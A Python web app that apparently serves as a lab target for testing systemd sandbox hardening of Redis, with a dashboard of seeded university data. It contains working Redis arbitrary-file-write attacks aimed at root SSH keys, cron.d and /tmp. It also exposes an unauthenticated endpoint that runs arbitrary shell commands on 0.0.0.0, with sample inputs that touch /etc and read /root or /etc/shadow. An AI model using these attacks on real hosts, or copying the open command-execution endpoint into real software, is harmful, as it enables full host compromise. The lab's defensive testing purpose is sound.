#!/usr/bin/env python3
"""
Python Web Frontend with University Portal Dashboard & REST API.
Connects to the official Redis server on 127.0.0.1:6379 over RESP protocol.
Displays seeded user, course, and session data, and provides test buttons for
normal traffic profiling as well as security exploit verification.
"""

import sys
import os
import json
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import subprocess

HTTP_PORT = 8080
DB_HOST = "127.0.0.1"
DB_PORT = 6379
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(SCRIPT_DIR, "data")

def redis_cmd(parts):
    """Executes a command list against Redis on 127.0.0.1:6379 using RESP binary protocol."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.5)
        s.connect((DB_HOST, DB_PORT))
        
        payload = f"*{len(parts)}\r\n"
        for p in parts:
            sp = str(p)
            payload += f"${len(sp.encode('utf-8'))}\r\n{sp}\r\n"
        s.sendall(payload.encode("utf-8"))
        
        f = s.makefile("rb")

        def parse():
            b = f.read(1)
            if not b:
                return None
            if b in (b"+", b":", b"-"):
                return f.readline().decode("utf-8", "replace").strip()
            elif b == b"$":
                line = f.readline().strip()
                if not line:
                    return None
                length = int(line)
                if length == -1:
                    return None
                data = f.read(length).decode("utf-8", "replace")
                f.read(2)  # consume trailing \r\n
                return data
            elif b == b"*":
                line = f.readline().strip()
                if not line:
                    return []
                cnt = int(line)
                if cnt == -1:
                    return []
                return [parse() for _ in range(cnt)]
            return f.readline().decode("utf-8", "replace").strip()

        res = parse()
        s.close()
        return res
    except Exception as e:
        return f"ERROR: {e}"

def query_db(cmd):
    """Executes a command string from the user console and formats output nicely."""
    parts = cmd.strip().split()
    if not parts:
        return "(empty command)"
    res = redis_cmd(parts)
    if isinstance(res, list):
        # Format list/hash nicely
        return "\n".join(str(item) for item in res)
    return str(res)

def get_dashboard_data():
    """Fetches seeded records from Redis to populate frontend dashboard."""
    data = {
        "status": "Online",
        "redis_version": "Unknown",
        "keys_count": 0,
        "users": [],
        "courses": [],
        "sessions": [],
        "system": {}
    }

    # Fetch Info
    info = redis_cmd(["INFO"])
    if isinstance(info, str) and not info.startswith("ERROR"):
        for line in info.splitlines():
            if line.startswith("redis_version:"):
                data["redis_version"] = line.split(":", 1)[1].strip()
    elif isinstance(info, str) and info.startswith("ERROR"):
        data["status"] = "Offline (" + info + ")"
        return data

    # System status
    for k in ["system:portal_title", "system:status", "system:sandbox_mode", "system:last_audit"]:
        val = redis_cmd(["GET", k])
        data["system"][k.replace("system:", "")] = val if isinstance(val, str) else "N/A"

    # Fetch Users
    uids = redis_cmd(["SMEMBERS", "users:all"])
    if isinstance(uids, list):
        for uid in sorted(uids):
            h = redis_cmd(["HGETALL", uid])
            if isinstance(h, list) and len(h) >= 2:
                # Array of key, val pairs
                d = dict(zip(h[0::2], h[1::2]))
                d["id"] = uid
                data["users"].append(d)

    # Fetch Courses
    cids = redis_cmd(["SMEMBERS", "courses:all"])
    if isinstance(cids, list):
        for cid in sorted(cids):
            h = redis_cmd(["HGETALL", cid])
            if isinstance(h, list) and len(h) >= 2:
                d = dict(zip(h[0::2], h[1::2]))
                d["id"] = cid
                data["courses"].append(d)

    # Fetch Sessions
    sids = redis_cmd(["SMEMBERS", "sessions:all"])
    if isinstance(sids, list):
        for sid in sorted(sids):
            h = redis_cmd(["HGETALL", sid])
            if isinstance(h, list) and len(h) >= 2:
                d = dict(zip(h[0::2], h[1::2]))
                d["token"] = sid
                data["sessions"].append(d)

    data["keys_count"] = len(data["users"]) + len(data["courses"]) + len(data["sessions"]) + len(data["system"])
    return data

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>University Security Lab - Student & Portal Database</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #eef2f6; color: #333; }
        header { background: #1e293b; color: white; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        header h1 { margin: 0; font-size: 22px; font-weight: 600; }
        .container { max-width: 1200px; margin: 25px auto; padding: 0 20px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 25px; }
        h2 { margin-top: 0; font-size: 18px; color: #0f172a; border-bottom: 2px solid #f1f5f9; padding-bottom: 10px; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 600; }
        .badge-green { background: #dcfce7; color: #166534; }
        .badge-red { background: #fee2e2; color: #991b1b; }
        .badge-blue { background: #dbeafe; color: #1e40af; }
        .badge-amber { background: #fef3c7; color: #92400e; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }
        th, td { text-align: left; padding: 10px; border-bottom: 1px solid #e2e8f0; }
        th { background: #f8fafc; color: #475569; font-weight: 600; }
        tr:hover { background: #f1f5f9; }
        .btn-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
        button { padding: 9px 15px; font-size: 13px; font-weight: 500; border: none; border-radius: 5px; cursor: pointer; transition: background 0.15s; }
        .btn-primary { background: #2563eb; color: white; }
        .btn-primary:hover { background: #1d4ed8; }
        .btn-warning { background: #d97706; color: white; }
        .btn-warning:hover { background: #b45309; }
        .btn-danger { background: #dc2626; color: white; }
        .btn-danger:hover { background: #b91c1c; }
        .btn-secondary { background: #64748b; color: white; }
        .btn-secondary:hover { background: #475569; }
        input[type="text"] { width: 75%; padding: 10px; font-size: 14px; border: 1px solid #cbd5e1; border-radius: 5px; }
        pre#output { background: #0f172a; color: #38bdf8; padding: 15px; border-radius: 6px; font-family: monospace; font-size: 13px; max-height: 250px; overflow-y: auto; white-space: pre-wrap; }
        .status-pill { display: flex; gap: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <header>
        <div>
            <h1>University Security Lab - Student & Portal Database</h1>
            <div style="font-size: 13px; color: #94a3b8; margin-top: 4px;">Evaluated Target: Official Redis Database + systemd Sandboxing</div>
        </div>
        <div class="status-pill">
            <span>Status: <strong id="head-status" class="badge badge-green">Checking...</strong></span>
            <span>Redis Version: <strong id="head-version" class="badge badge-blue">-</strong></span>
        </div>
    </header>

    <div class="container">
        <!-- Overview Grid -->
        <div class="grid-2">
            <div class="card">
                <h2>Enrolled Students & Faculty (Redis Key: user:*)</h2>
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr><th>UID</th><th>Name</th><th>Role</th><th>Email</th><th>Department</th></tr>
                        </thead>
                        <tbody id="users-tbody">
                            <tr><td colspan="5">Loading data from Redis...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="card">
                <h2>Academic Courses & Modules (Redis Key: course:*)</h2>
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr><th>Code</th><th>Course Title</th><th>Instructor</th><th>Room</th><th>Enrolled</th></tr>
                        </thead>
                        <tbody id="courses-tbody">
                            <tr><td colspan="5">Loading data from Redis...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>Active Authentication Sessions (Redis Key: session:*)</h2>
            <table>
                <thead>
                    <tr><th>Session Token</th><th>User</th><th>Client IP</th><th>Login Timestamp</th></tr>
                </thead>
                <tbody id="sessions-tbody">
                    <tr><td colspan="4">Loading data from Redis...</td></tr>
                </tbody>
            </table>
        </div>

        <!-- Security Evaluation & Exploit Console -->
        <div class="card">
            <h2>Security Evaluation & Exploit Console (CWE-22 / CWE-276)</h2>
            <p style="font-size: 14px; color: #475569;">
                Use these buttons to test <strong>normal operations</strong> (while profiling with <code>sysdhardener observe</code>) 
                and to test <strong>unauthorized snapshot write attacks</strong> (before and after applying systemd hardening).
            </p>

            <div style="margin-bottom: 15px;">
                <strong>1. Legitimate Database Traffic (Normal Profiling):</strong>
                <div class="btn-group">
                    <button class="btn-primary" onclick="runCmd('PING')">Ping Redis</button>
                    <button class="btn-primary" onclick="runCmd('HGETALL user:101')">Read Student Alice (user:101)</button>
                    <button class="btn-primary" onclick="runCmd('HGETALL course:SEC502')">Read Course (SEC502)</button>
                    <button class="btn-primary" onclick="runCmd('SAVE')">Trigger Clean Snapshot (SAVE)</button>
                    <button class="btn-secondary" onclick="restoreCleanData()">Reset Data Directory & Snapshot</button>
                    <button class="btn-secondary" onclick="refreshDashboard()">Refresh Dashboard Data</button>
                </div>
            </div>

            <div style="margin-bottom: 15px;">
                <strong style="color: #b91c1c;">2. Exploit Attacks (Arbitrary File Overwrite & Host Compromise):</strong>
                <div class="btn-group">
                    <button class="btn-warning" onclick="runExploitTmp()">Exploit 1: Write to /tmp/pwn.txt (Outside Data Dir)</button>
                    <button class="btn-danger" onclick="runExploitSsh()">Exploit 2: Overwrite /root/.ssh/authorized_keys (Root SSH Takeover)</button>
                    <button class="btn-danger" onclick="runExploitCron()">Exploit 3: Write to /etc/cron.d/pwn_backdoor (Cron Backdoor)</button>
                    <button class="btn-danger" onclick="runExploitBash('touch /etc/rce_backdoor.txt &amp;&amp; ls -la /root')">Exploit 4: Remote Bash Command (touch /etc/rce_backdoor.txt &amp;&amp; ls /root)</button>
                </div>
            </div>

            <div style="margin-bottom: 15px;">
                <strong>3. Raw Redis Command:</strong><br>
                <div style="margin-top: 8px;">
                    <input type="text" id="cmdInput" value="INFO" placeholder="e.g. GET system:status, CONFIG GET dir, or SAVE">
                    <button class="btn-primary" onclick="runCustomInput()">Send Command</button>
                </div>
            </div>

            <div>
                <strong style="color: #b91c1c;">4. Injected Bash Command (Test Sandbox Confinement):</strong><br>
                <div style="margin-top: 8px;">
                    <input type="text" id="bashInput" value="whoami &amp;&amp; touch /etc/hacked.txt &amp;&amp; ls -la /root" placeholder="e.g. touch /etc/hacked.txt, ls /root, cat /etc/shadow">
                    <button class="btn-danger" onclick="runCustomBashInput()">Run Injected Bash</button>
                </div>
            </div>

            <h3 style="font-size: 14px; margin-top: 20px; color: #334155;">Command Output:</h3>
            <pre id="output">Waiting for command execution...</pre>
        </div>
    </div>

    <script>
        function refreshDashboard() {
            fetch('/api/dashboard')
                .then(r => r.json())
                .then(d => {
                    document.getElementById('head-status').innerText = d.status;
                    document.getElementById('head-status').className = d.status.startsWith('Online') ? 'badge badge-green' : 'badge badge-red';
                    document.getElementById('head-version').innerText = d.redis_version;

                    // Populate Users
                    let utbody = document.getElementById('users-tbody');
                    if (d.users.length > 0) {
                        utbody.innerHTML = d.users.map(u => `
                            <tr>
                                <td><code>${u.id}</code></td>
                                <td><strong>${u.name || '-'}</strong></td>
                                <td><span class="badge ${u.role === 'admin' ? 'badge-red' : (u.role === 'faculty' ? 'badge-amber' : 'badge-blue')}">${u.role || '-'}</span></td>
                                <td>${u.email || '-'}</td>
                                <td>${u.dept || '-'}</td>
                            </tr>
                        `).join('');
                    } else {
                        utbody.innerHTML = '<tr><td colspan="5" style="color:#64748b;">No user records found in Redis.</td></tr>';
                    }

                    // Populate Courses
                    let ctbody = document.getElementById('courses-tbody');
                    if (d.courses.length > 0) {
                        ctbody.innerHTML = d.courses.map(c => `
                            <tr>
                                <td><span class="badge badge-blue">${c.code || c.id}</span></td>
                                <td>${c.title || '-'}</td>
                                <td>${c.instructor || '-'}</td>
                                <td><code>${c.room || '-'}</code></td>
                                <td>${c.enrolled || '-'}</td>
                            </tr>
                        `).join('');
                    } else {
                        ctbody.innerHTML = '<tr><td colspan="5" style="color:#64748b;">No course records found in Redis.</td></tr>';
                    }

                    // Populate Sessions
                    let stbody = document.getElementById('sessions-tbody');
                    if (d.sessions.length > 0) {
                        stbody.innerHTML = d.sessions.map(s => `
                            <tr>
                                <td><code>${s.token}</code></td>
                                <td><strong>${s.username || s.uid || '-'}</strong></td>
                                <td><code>${s.ip || '-'}</code></td>
                                <td>${s.login_time || '-'}</td>
                            </tr>
                        `).join('');
                    } else {
                        stbody.innerHTML = '<tr><td colspan="4" style="color:#64748b;">No active sessions in Redis.</td></tr>';
                    }
                })
                .catch(e => {
                    document.getElementById('head-status').innerText = 'Offline';
                    document.getElementById('head-status').className = 'badge badge-red';
                });
        }

        function runCmd(c) {
            document.getElementById('output').innerText = 'Executing: ' + c + ' ...';
            fetch('/api/query?cmd=' + encodeURIComponent(c))
                .then(r => r.text())
                .then(txt => {
                    document.getElementById('output').innerText = txt;
                })
                .catch(e => {
                    document.getElementById('output').innerText = 'Error: ' + e;
                });
        }

        function runCustomInput() {
            var val = document.getElementById('cmdInput').value;
            if (val) runCmd(val);
        }

        function runExploitBash(cmd) {
            document.getElementById('output').innerText = 'Simulating RCE: Executing bash in service sandbox context: ' + cmd + ' ...';
            fetch('/api/exec?cmd=' + encodeURIComponent(cmd))
                .then(r => r.text())
                .then(txt => {
                    document.getElementById('output').innerText = txt;
                })
                .catch(e => {
                    document.getElementById('output').innerText = 'Error executing bash command: ' + e;
                });
        }

        function runCustomBashInput() {
            var val = document.getElementById('bashInput').value;
            if (val) runExploitBash(val);
        }

        function restoreCleanData() {
            document.getElementById('output').innerText = 'Restoring clean data directory and triggering snapshot...';
            fetch('/api/restore-clean')
                .then(r => r.text())
                .then(txt => {
                    document.getElementById('output').innerText = txt;
                    refreshDashboard();
                })
                .catch(e => {
                    document.getElementById('output').innerText = 'Error restoring clean data: ' + e;
                });
        }

        function runExploitTmp() {
            document.getElementById('output').innerText = 'Simulating Exploit: Attempting to write outside data directory to /tmp/pwn.txt...';
            fetch('/api/query?cmd=' + encodeURIComponent('CONFIG SET dir /tmp'))
                .then(() => fetch('/api/query?cmd=' + encodeURIComponent('CONFIG SET dbfilename pwn.txt')))
                .then(() => fetch('/api/query?cmd=SAVE'))
                .then(r => r.text())
                .then(txt => {
                    document.getElementById('output').innerText = 'CONFIG SET dir /tmp -> SAVE:\\n' + txt + 
                        (txt.includes('OK') ? '\\n\\n[VULNERABLE]: Successfully wrote to /tmp/pwn.txt (Unhardened)!' : '\\n\\n[HARDENED]: Blocked by systemd sandbox (ProtectSystem=strict / ReadWritePaths)!');
                })
                .catch(e => {
                    document.getElementById('output').innerText = 'Error: ' + e;
                });
        }

        function runExploitSsh() {
            document.getElementById('output').innerText = 'Simulating Exploit: Attempting to write root SSH authorized_keys...';
            fetch('/api/query?cmd=' + encodeURIComponent('CONFIG SET dir /root/.ssh'))
                .then(() => fetch('/api/query?cmd=' + encodeURIComponent('CONFIG SET dbfilename authorized_keys')))
                .then(() => fetch('/api/query?cmd=SAVE'))
                .then(r => r.text())
                .then(txt => {
                    document.getElementById('output').innerText = 'CONFIG SET dir /root/.ssh -> SAVE:\\n' + txt +
                        (txt.includes('OK') ? '\\n\\n[VULNERABLE]: Host Compromised: /root/.ssh/authorized_keys was written!' : '\\n\\n[HARDENED]: Blocked by systemd sandbox (ProtectSystem=strict / ProtectHome)!');
                })
                .catch(e => {
                    document.getElementById('output').innerText = 'Error: ' + e;
                });
        }

        function runExploitCron() {
            document.getElementById('output').innerText = 'Simulating Exploit: Attempting to write cron job into /etc/cron.d/...';
            fetch('/api/query?cmd=' + encodeURIComponent('CONFIG SET dir /etc/cron.d'))
                .then(() => fetch('/api/query?cmd=' + encodeURIComponent('CONFIG SET dbfilename pwn_cron')))
                .then(() => fetch('/api/query?cmd=SAVE'))
                .then(r => r.text())
                .then(txt => {
                    document.getElementById('output').innerText = 'CONFIG SET dir /etc/cron.d -> SAVE:\\n' + txt +
                        (txt.includes('OK') ? '\\n\\n[VULNERABLE]: Host Compromised: /etc/cron.d/ was written!' : '\\n\\n[HARDENED]: Blocked by systemd sandbox (ProtectSystem=strict)!');
                })
                .catch(e => {
                    document.getElementById('output').innerText = 'Error: ' + e;
                });
        }

        refreshDashboard();
    </script>
</body>
</html>
"""

class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if path == "/" or path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))

        elif path == "/api/dashboard":
            data = get_dashboard_data()
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(data).encode("utf-8"))

        elif path == "/api/status":
            info = query_db("INFO")
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "running", "backend": info}).encode("utf-8"))

        elif path == "/api/query":
            cmd = query.get("cmd", ["PING"])[0]
            res = query_db(cmd)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(res.encode("utf-8"))

        elif path == "/api/restore-clean":
            r1 = query_db(f"CONFIG SET dir {DATA_DIR}")
            r2 = query_db("CONFIG SET dbfilename dump.rdb")
            r3 = query_db("SAVE")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(f"Restored clean data directory ({DATA_DIR}): {r3}".encode("utf-8"))

        elif path == "/api/exec":
            cmd = query.get("cmd", ["whoami && id"])[0]
            try:
                p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                stdout = p.stdout.strip()
                stderr = p.stderr.strip()
                code = p.returncode

                out_lines = [f"$ {cmd}", f"Exit Code: {code}"]
                if stdout:
                    out_lines.append(f"STDOUT:\n{stdout}")
                if stderr:
                    out_lines.append(f"STDERR:\n{stderr}")

                is_blocked = (
                    "Read-only file system" in stderr or
                    "Permission denied" in stderr or
                    "Operation not permitted" in stderr
                )
                if is_blocked:
                    out_lines.append("\n[HARDENED - CONFINED BY SYSTEMD SANDBOX]:")
                    out_lines.append("The Linux kernel rejected the command (Read-only file system / Permission denied).")
                    out_lines.append("Systemd sandboxing successfully prevented host modification!")
                elif code == 0:
                    out_lines.append("\n[UNHARDENED - FULL HOST PRIVILEGES]:")
                    out_lines.append("Command executed with unrestricted host access!")
                else:
                    out_lines.append(f"\n[COMMAND TERMINATED WITH EXIT CODE {code}]")

                res_text = "\n".join(out_lines)
            except Exception as e:
                res_text = f"Execution error: {e}"

            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(res_text.encode("utf-8"))

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def log_message(self, format, *args):
        sys.stderr.write(f"[WebFrontend] {self.address_string()} - {format % args}\n")

def main():
    server_address = ("0.0.0.0", HTTP_PORT)
    httpd = HTTPServer(server_address, PortalHandler)
    sys.stderr.write(f"[WebFrontend] Serving at http://127.0.0.1:{HTTP_PORT}\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        sys.stderr.write("[WebFrontend] Stopping server...\n")

if __name__ == "__main__":
    main()
